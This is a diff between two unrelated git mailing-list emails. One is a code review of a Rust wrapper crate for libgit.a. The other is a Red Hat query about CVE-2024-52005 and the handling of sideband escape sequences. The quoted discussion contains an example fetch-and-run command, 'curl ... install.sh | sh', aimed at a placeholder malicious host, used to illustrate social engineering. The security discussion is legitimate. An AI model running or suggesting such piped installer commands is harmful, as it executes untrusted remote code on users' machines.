@@ -1,229 +1,181 @@
-Received: from mail-wm1-f50.google.com (mail-wm1-f50.google.com [209.85.128.50])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.129.124])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2E7CB42AA3
-	for <git@vger.kernel.org>; Tue, 28 Jan 2025 15:08:51 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.50
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F1D486AA7
+	for <git@vger.kernel.org>; Tue, 28 Jan 2025 16:03:20 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=170.10.129.124
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1738076934; cv=none; b=VEY9Omwed93nxv6DGjADPTcmrvEPSXZ7RVHNryIfdXac1GWJ0B50GDXizzYL8MGbwDYsUrvLDPO3i/h8ZGzcNf+ENq5q7CFceT9xhwQvKGkFPBxGgfcfQBiMeUuvHQ8JX2kZyqdKPj03HCYKJorv65/zSm9RFv3QGr0GUIMFCEo=
+	t=1738080202; cv=none; b=PDEsId2FspQuDFp6HGIcC54a6MaTqkt9mmQICx9B9/DdnMfOCOUiASEoKu/6OkkiXng7EMfRvyGpGnAfjYaguuv0Jum/dQrYqQRRBcTrzDzQ333FAuyKrvMK0e0/x4zanqozarLml7i/wE65XeAAOY+e80aurgnvgHON/ziIYAU=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1738076934; c=relaxed/simple;
-	bh=ggZgMadSAKdh7usy07F6Sdg68leJAOzcc4LBCsehTJQ=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=IptBoSEL3hSB6+TTRxNoYP6MvYitilZTMDVog3GpjxeUEjvpGb2MZWvk3H8a8bSUm4fZLiZLfhC+A2Z1/LLZebqFDbUMD05pCMMQg6xeBDdwYn39t45cnB8fktzMMjmD2Bb/RaxzaKi7h3N/QA456GXokBZesp1dSvvsEJVu/f4=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=DQ7UNiJi; arc=none smtp.client-ip=209.85.128.50
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1738080202; c=relaxed/simple;
+	bh=7g9yhWtLVz3MYAKoP0yNbADpNGWQ4W44oP1p390TZ/8=;
+	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
+	 To:Cc:Content-Type; b=rXNBQ3g10/ZKJuMVvNWLwd8YWX6fxd/RNMEsdIPR3LjSUEIjultLdh+mJEqlVEC6w+egQ2/hf7mgS/eCQiPqXq2ePJxvNXdUy7JIfkQazxoSK4Bdn67keMw2ejF/NzLCyZd40fVCwxgfbijgEFRiElAOJ55eF6//Jlj4gAKhuqk=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=redhat.com; spf=pass smtp.mailfrom=redhat.com; dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b=Qb2k1Xdm; arc=none smtp.client-ip=170.10.129.124
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=redhat.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="DQ7UNiJi"
-Received: by mail-wm1-f50.google.com with SMTP id 5b1f17b1804b1-435f8f29f8aso41076345e9.2
-        for <git@vger.kernel.org>; Tue, 28 Jan 2025 07:08:51 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20230601; t=1738076930; x=1738681730; darn=vger.kernel.org;
-        h=content-transfer-encoding:in-reply-to:content-language:from
-         :references:cc:to:subject:reply-to:user-agent:mime-version:date
-         :message-id:from:to:cc:subject:date:message-id:reply-to;
-        bh=C8bYkeSksXh2fh+NDH2VfdfeWG0urrPLKJOh53cZxJU=;
-        b=DQ7UNiJi7+viJ0vn6fH64HHVri9upnhAG6onWXw/SE8anz+SFZhZsqNE73AI6ooJMN
-         M/I/wQ5IokKOkmEAHUQ3YIk49nGjgdm+rutwCJyiLXgOnINrzWVPvn1OZHhPDB2L3Hzu
-         Uw0MIvy4LaQJe1o8okVQzSY0uBcpJDMRB3ZjfexDjSifCsz/bypPupsE39gIpcs0cuwZ
-         D/4lOSuJSF3n0NDQTvP6Y4lxt0eTf+8Jf+vuRD0mWVdXo+jL25BCuUUd9PNbB2H2Zi5t
-         wNuJaa33Kuh9XfX5/T+yuhMH6rLm1nPjEyLfOGY0Zcvhdr3o+RtTAuI6EL7uTS247f8e
-         P8Ww==
+	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="Qb2k1Xdm"
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
+	s=mimecast20190719; t=1738080199;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:
+	 in-reply-to:in-reply-to:references:references;
+	bh=rIz8ngx6PfSWvUIhAEUPDuz1TYX2Y2dugy1hCsjStxQ=;
+	b=Qb2k1XdmTEImgRqQvJn2bFUKZNiGECcVC0xi4IyiFdA8tMt+yJdUZ13MXtjfb57TCfsH7+
+	P0fl0aGTCjQs43kdF2lD8s40gwVuJOowGmAAfd5bxFr6pdwSvZkPsAWCIfbrRhEjQcpui+
+	3EHbl1N6+fMn3ztIHLaPVBUhyPAru7U=
+Received: from mail-ej1-f72.google.com (mail-ej1-f72.google.com
+ [209.85.218.72]) by relay.mimecast.com with ESMTP with STARTTLS
+ (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
+ us-mta-501-yObznor5NHKTwazSqHLF6Q-1; Tue, 28 Jan 2025 11:03:18 -0500
+X-MC-Unique: yObznor5NHKTwazSqHLF6Q-1
+X-Mimecast-MFC-AGG-ID: yObznor5NHKTwazSqHLF6Q
+Received: by mail-ej1-f72.google.com with SMTP id a640c23a62f3a-ab341e14e27so660444066b.3
+        for <git@vger.kernel.org>; Tue, 28 Jan 2025 08:03:18 -0800 (PST)
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1738076930; x=1738681730;
-        h=content-transfer-encoding:in-reply-to:content-language:from
-         :references:cc:to:subject:reply-to:user-agent:mime-version:date
-         :message-id:x-gm-message-state:from:to:cc:subject:date:message-id
-         :reply-to;
-        bh=C8bYkeSksXh2fh+NDH2VfdfeWG0urrPLKJOh53cZxJU=;
-        b=fA42IyvQl291fdKCZyl2zQ7avCCl1o45bMgFpdjdHfPYqj9VWO/z+ZmZR2BA2bIC8r
-         0iDnidhbb1jPKxdBYC8vDpVhwd4J4UPHdBUavqiDfLd1Wi6VdNsiJc9tPpjRuUJ+t6UU
-         QcuXh5DZ0Eu/cXSuF85jvb34b6haDI+8uxGlXE34iQEJ6qxI67rnX6fR19+GuzNknooT
-         y7Jxb7g/eYRUY2Wfir4BG77KpvtoHLQFIYMrd27DE/Bo8TEAN9JFP+PETPpaz3xlrjja
-         wy20U6dioSblck6jWZ4fCBbrYoystZbDBuLhTco3LbzWGYKokHk01qfINEKP5iOYE59x
-         6lTQ==
-X-Forwarded-Encrypted: i=1; AJvYcCVLTg0lbgNKwpSpibneFcwos1ZV0Lqn3mbUlSSkJLxv0tO6YvWN1Psyb5XBKWdeLhCZa84=@vger.kernel.org
-X-Gm-Message-State: AOJu0YxcnobQ8UMl8YopS1vZvEhsay0yQkCAvh1gKdXfl8PdVQj55auj
-	eOm8x6VeMoccbwwer9Iyk7P2NeM4viZciOOygnIzt7x3XRi+zFgg
-X-Gm-Gg: ASbGncsFvtbku92nlWJeS+A2QhJ0+WQ+1XP5ZHYnD6xSbq+75tWfQdb5lirOH63MMXx
-	upfhiotIBRIARK7f9/O5uVwTiGkNfE2Zqv7RKQ/FINWS84npKyWskiHR5l2xiLyHsT/gI1LWwqU
-	e91i9VQwAaER9WJ1ROgRhwmZMwKlAr4cds0AfG9IaB5iWYPRnlEr3kJoF8BFskQpTzgqd+/uLLA
-	y1E+w/BkNQC2iJK+r78EVtEj86wrATM6cj/+I5JOOuTbR6sx6sdb3WA8F/nXr4bsf4vOy2ywsEv
-	ye7PZnQRqssSJDga0BxLWAWNZZnX84yTt9tO7Hprr3BghxhwzjeyXQzb0DIb2rUmpdeRmQ==
-X-Google-Smtp-Source: AGHT+IGMt56KSdDWCB618RTcFcvUhOlMJu98j0S5NVMaDn4SDiA1cWvuchIC4kyPWrrn1r9apsEU4Q==
-X-Received: by 2002:a05:600c:3114:b0:436:1aa6:b8ee with SMTP id 5b1f17b1804b1-438913bfe72mr432914205e9.2.1738076930017;
-        Tue, 28 Jan 2025 07:08:50 -0800 (PST)
-Received: from ?IPV6:2a0a:ef40:700:a501:27ae:70ed:9eda:7f80? ([2a0a:ef40:700:a501:27ae:70ed:9eda:7f80])
-        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-438bd4fa3efsm174354555e9.2.2025.01.28.07.08.49
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Tue, 28 Jan 2025 07:08:49 -0800 (PST)
-Message-ID: <3559a70c-7ed3-41cd-a45f-390134218c52@gmail.com>
-Date: Tue, 28 Jan 2025 15:08:48 +0000
+        d=1e100.net; s=20230601; t=1738080197; x=1738684997;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
+         :subject:date:message-id:reply-to;
+        bh=rIz8ngx6PfSWvUIhAEUPDuz1TYX2Y2dugy1hCsjStxQ=;
+        b=aS3vR8Wspo5/XY0Ot2973JVsl6zyFYrPICAUxUo76LAA+/LCN4cUSspvwKb+vucf3u
+         OB64j41ETJTWmfV5iD13JX4ZiyN9dnL1HAUTxacXthTnBhyu5rk+2AHceT0QyBkLxlOy
+         7w2h+Nax5GOnOkXoDqhzvE5ICj3sa9qBJBuTUf/s+bs6WMiGFv9eTilW5wl14N8Oi1SD
+         0xSKmxdyciOqd7hr1pUJECQfmc+90QgRQLq1UL4uNkgklndXfLesYJIX1gj4hSGPy9l3
+         03wrBeifgo1UmXMMTeYYJ73FOtbI0++YHdlWlcIoOt9ezNwXUJEf0fLrIK6yWT49AKux
+         EDXg==
+X-Forwarded-Encrypted: i=1; AJvYcCXbsi3TODxGUHmn1Fwyz79/3d/S835SVaO1leBKslE5IuOFce6sVCobHdgEre00OIDXRog=@vger.kernel.org
+X-Gm-Message-State: AOJu0Ywjxwx64ChqNLUYG9kXaqMamtHll0JqLTSu2DPng8VSx9Hhof9S
+	7PaXes4nJviPTAGimu2r7WxiJ38MsaupCAvzCOACnYSDDFW556+gdA7YMS5TS1h7I+UCe4KUcvZ
+	Iges/xpEQlZ6ySdH4KVWxwdkcl8EjW5BwsWmPk6fjWyELee3isSrS+UW8jTFp6K/ZivJc3UCmqo
+	xeLjnEquGParLSJwZRNtIp99EN
+X-Gm-Gg: ASbGncs4iio4kjGr+PXpkaeVWLzufQEwA57dDIr+wJuyV0Okzq00Svr+XHpL4bPnoA9
+	iljGSkKIjtQlRE8BLgK+xe6aVLVZHUKfWFAekR3u1nQfSNJNORyTPN/ZAXlK1fXWbvj6qVG+gNl
+	0ou0njpPDoIQXeR2S+2qQ=
+X-Received: by 2002:a17:907:7faa:b0:a9e:b150:a99d with SMTP id a640c23a62f3a-ab38b1b45aamr4246798266b.5.1738080195378;
+        Tue, 28 Jan 2025 08:03:15 -0800 (PST)
+X-Google-Smtp-Source: AGHT+IHpgucLxN8DakVDUZtsNQ2QP/m8zN2S4UnS9u522HTGaYyYHiiIXXmb/C7bxBZwoKt+nkEuohqXQb43irwrcVk=
+X-Received: by 2002:a17:907:7faa:b0:a9e:b150:a99d with SMTP id
+ a640c23a62f3a-ab38b1b45aamr4246792566b.5.1738080194859; Tue, 28 Jan 2025
+ 08:03:14 -0800 (PST)
 Precedence: bulk
 X-Mailing-List: git@vger.kernel.org
 List-Id: <git.vger.kernel.org>
 List-Subscribe: <mailto:git+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:git+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Reply-To: phillip.wood@dunelm.org.uk
-Subject: Re: [PATCH v7 2/4] libgit-sys: introduce Rust wrapper for libgit.a
-To: Josh Steadmon <steadmon@google.com>, git@vger.kernel.org
-Cc: calvinwan@google.com, nasamuffin@google.com, emrass@google.com,
- gitster@pobox.com, sandals@crustytoothpaste.net, ps@pks.im
-References: <cover.1723054623.git.steadmon@google.com>
- <cover.1738023208.git.steadmon@google.com>
- <f1502b85901d81889d86597f31eca40e1965d56f.1738023208.git.steadmon@google.com>
-From: Phillip Wood <phillip.wood123@gmail.com>
-Content-Language: en-US
-In-Reply-To: <f1502b85901d81889d86597f31eca40e1965d56f.1738023208.git.steadmon@google.com>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 7bit
+References: <pull.1853.git.1736878772.gitgitgadget@gmail.com>
+ <Z4bqMYKRP7Gva5St@tapette.crustytoothpaste.net> <xmqqwmevtfye.fsf@gitster.g>
+In-Reply-To: <xmqqwmevtfye.fsf@gitster.g>
+From: Ondrej Pohorelsky <opohorel@redhat.com>
+Date: Tue, 28 Jan 2025 17:03:03 +0100
+X-Gm-Features: AWEUYZnLoKPn03zeKUhvEVPS-7NWZQxOi68gB_ZeetQ0wYQbI92YHYaIdQIr5sI
+Message-ID: <CA+B51BHQe_X=b9ncuwhBDi873OAZst=PAULiARs0NARy58VfnA@mail.gmail.com>
+Subject: Re: [PATCH 0/3] Sanitize sideband channel messages
+To: Junio C Hamano <gitster@pobox.com>
+Cc: "brian m. carlson" <sandals@crustytoothpaste.net>, 
+	Johannes Schindelin via GitGitGadget <gitgitgadget@gmail.com>, git@vger.kernel.org, 
+	Johannes Schindelin <johannes.schindelin@gmx.de>
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hi,
+I see that CVE-2024-52005 [0] has been assigned to this issue. From
+the discussion, it seems the fix may not be shipped in the near
+future, if at all.
+
+Could you please confirm if I understand this correctly? Specifically,
+that this is not being treated as a vulnerability and that the
+proposed fix might introduce regressions for certain use cases?
+We are bound by SLAs and need to decide soon whether to provide fixed
+versions of Git in RHEL. Having clarity on the upstream stance would
+be very helpful for our decision. Right now, we are inclined not to
+ship these fixes unless they are accepted upstream.
+
+[0] https://github.com/git/git/security/advisories/GHSA-7jjc-gg6m-3329
 
 
+Best regards,
+Ond=C5=99ej Poho=C5=99elsk=C3=BD
 
-On 28/01/2025 00:19, Josh Steadmon wrote:
-> Introduce libgit-sys, a Rust wrapper crate that allows Rust code to call
-> functions in libgit.a. This initial patch defines build rules and an
-> interface that exposes user agent string getter functions as a proof of
-> concept. This library can be tested with `cargo test`. 
 
-It's great to see some tests. This is looking good, I've left a couple 
-of small comments below.
+On Thu, Jan 16, 2025 at 7:47=E2=80=AFAM Junio C Hamano <gitster@pobox.com> =
+wrote:
+>
+> "brian m. carlson" <sandals@crustytoothpaste.net> writes:
+>
+> > Where pre-receive hooks are available, people frequently run various
+> > commands to test and analyze code in them, including build or static
+> > analysis tools, such as Rust's Cargo.  Cargo is capable of printing a
+> > wide variety of escape sequences in its output, including `\e[K`, which
+> > overwrites text to the right (e.g., for progress bars and status output
+> > much like Git produces), and sequences for hyperlinks.  Stripping these
+> > sequences would break the output in ways that would be confusing to the
+> > user (since they work fine in a regular terminal) and hard to
+> > reproduce or fix.
+>
+> You have ruled out the attack vector that lets bytestream sent to
+> the terminal emulator to somehow cause arbitrary input bytes added
+> (which may require the final <ENTER> from the user but that is not
+> much of consolation), and I tend to agree with you on that point.
+>
+> With that misfeature out of the picture, I am not sure why terminal
+> escape sequences that may clear or write-over things on the screen
+> are of particular interest.  If the malicious remote end says
+> something like
+>
+>     To proceed, open another window and type this command:
+>
+>         $ curl https://my.malicious.xz/install.sh | sh
+>
+> to its output, even if the message is shown with the "remote: "
+> prefix on the receiving local client, wouldn't that cause certain
+> percentage of end-user population to copy-and-paste that command
+> anyway?
+>
+> > I agree that this would have been a nice feature to add at the beginnin=
+g
+> > of the development of the sideband feature, but I fear that it is too
+> > late to make an incompatible change now.
+>
+> So I am not so sure even it would have been a "nice feature" to disallow
+> sideband messages to carry terminal escape sequences to begin with.
+>
+> > I realize that you've provided an escape hatch, but as we've seen with
+> > other defense-in-depth measures, that doesn't avoid the inconvenience
+> > and hassle of dealing with those changes and the costs of deploying
+> > fixes everywhere.
+>
+> One more thing that I am not so happy about these "escape hatches"
+> is that they tend to be all or nothing (not limited to this round,
+> but common to other defense-in-depth attempts).  Having to say "I
+> trust them completely" is something that would make people uneasy.
+>
+> > We need to consider the costs and impact of these
+> > patches on our users, including the burden of dealing with incompatible
+> > changes, and given the fact that this problem can occur in a wide
+> > variety of other contexts which you are not solving here and which woul=
+d
+> > be better solved more generally in terminal emulators themselves, I
+> > don't think the benefits of this approach outweigh the downsides.
+> >
+> > I do agree that there are terminal emulators which have some surprising
+> > and probably insecure behaviour, as we've discussed in the past, but
+> > because I believe those issues are more general and could be a problem
+> > for any terminal-using program, I continue to believe that those issues
+> > are best addressed in the terminal emulator itself.
+>
 
-> +contrib/libgit-sys/partial_symbol_export.o: contrib/libgit-sys/public_symbol_export.o libgit.a reftable/libreftable.a xdiff/lib.a
-> +	$(LD) -r $^ -o $@
 
-This is a very long line and the ones below are pretty long - perhaps we 
-could put the list of sources in a variable?
+--=20
 
-> +contrib/libgit-sys/hidden_symbol_export.o: contrib/libgit-sys/partial_symbol_export.o
-> +	$(OBJCOPY) --localize-hidden $^ $@
-> +
-> +contrib/libgit-sys/libgitpub.a: contrib/libgit-sys/hidden_symbol_export.o
-> +	$(AR) $(ARFLAGS) $@ $^
- > [...]
-> diff --git a/contrib/libgit-sys/public_symbol_export.c b/contrib/libgit-sys/public_symbol_export.c
-> new file mode 100644
-> index 0000000000..cd1602206e
-> --- /dev/null
-> +++ b/contrib/libgit-sys/public_symbol_export.c
-> @@ -0,0 +1,22 @@
-> +/* Shim to publicly export Git symbols. These must be renamed so that the
+Ond=C5=99ej Poho=C5=99elsk=C3=BD
 
-Style: Multiline comments start with an empty "/*" so this should be
+Software Engineer
 
-/*
-  * Shim ...
+Red Hat
 
-> + * original symbols can be hidden. Renaming these with a "libgit_" prefix also
-> + * avoids conflicts with other libraries such as libgit2.
-> + */
-
-Best Wishes
-
-Phillip
-
-> +#include "git-compat-util.h"
-> +#include "contrib/libgit-sys/public_symbol_export.h"
-> +#include "version.h"
-> +
-> +#pragma GCC visibility push(default)
-> +
-> +const char *libgit_user_agent(void)
-> +{
-> +	return git_user_agent();
-> +}
-> +
-> +const char *libgit_user_agent_sanitized(void)
-> +{
-> +	return git_user_agent_sanitized();
-> +}
-> +
-> +#pragma GCC visibility pop
-> diff --git a/contrib/libgit-sys/public_symbol_export.h b/contrib/libgit-sys/public_symbol_export.h
-> new file mode 100644
-> index 0000000000..a3372f93fa
-> --- /dev/null
-> +++ b/contrib/libgit-sys/public_symbol_export.h
-> @@ -0,0 +1,8 @@
-> +#ifndef PUBLIC_SYMBOL_EXPORT_H
-> +#define PUBLIC_SYMBOL_EXPORT_H
-> +
-> +const char *libgit_user_agent(void);
-> +
-> +const char *libgit_user_agent_sanitized(void);
-> +
-> +#endif /* PUBLIC_SYMBOL_EXPORT_H */
-> diff --git a/contrib/libgit-sys/src/lib.rs b/contrib/libgit-sys/src/lib.rs
-> new file mode 100644
-> index 0000000000..d4853f3074
-> --- /dev/null
-> +++ b/contrib/libgit-sys/src/lib.rs
-> @@ -0,0 +1,46 @@
-> +#[cfg(has_std__ffi__c_char)]
-> +use std::ffi::c_char;
-> +
-> +#[cfg(not(has_std__ffi__c_char))]
-> +#[allow(non_camel_case_types)]
-> +pub type c_char = i8;
-> +
-> +extern crate libz_sys;
-> +
-> +extern "C" {
-> +    pub fn libgit_user_agent() -> *const c_char;
-> +    pub fn libgit_user_agent_sanitized() -> *const c_char;
-> +}
-> +
-> +#[cfg(test)]
-> +mod tests {
-> +    use std::ffi::CStr;
-> +
-> +    use super::*;
-> +
-> +    #[test]
-> +    fn user_agent_starts_with_git() {
-> +        let c_str = unsafe { CStr::from_ptr(libgit_user_agent()) };
-> +        let agent = c_str
-> +            .to_str()
-> +            .expect("User agent contains invalid UTF-8 data");
-> +        assert!(
-> +            agent.starts_with("git/"),
-> +            r#"Expected user agent to start with "git/", got: {}"#,
-> +            agent
-> +        );
-> +    }
-> +
-> +    #[test]
-> +    fn sanitized_user_agent_starts_with_git() {
-> +        let c_str = unsafe { CStr::from_ptr(libgit_user_agent_sanitized()) };
-> +        let agent = c_str
-> +            .to_str()
-> +            .expect("Sanitized user agent contains invalid UTF-8 data");
-> +        assert!(
-> +            agent.starts_with("git/"),
-> +            r#"Expected user agent to start with "git/", got: {}"#,
-> +            agent
-> +        );
-> +    }
-> +}
-> diff --git a/t/Makefile b/t/Makefile
-> index daa5fcae86..53ba01c21b 100644
-> --- a/t/Makefile
-> +++ b/t/Makefile
-> @@ -177,3 +177,13 @@ perf:
->   
->   .PHONY: pre-clean $(T) aggregate-results clean valgrind perf \
->   	check-chainlint clean-chainlint test-chainlint $(UNIT_TESTS)
-> +
-> +.PHONY: libgit-sys-test
-> +libgit-sys-test:
-> +	$(QUIET)(\
-> +		cd ../contrib/libgit-sys && \
-> +		cargo test \
-> +	)
-> +ifdef INCLUDE_LIBGIT_RS
-> +all:: libgit-sys-test
-> +endif
+opohorel@redhat.com
 
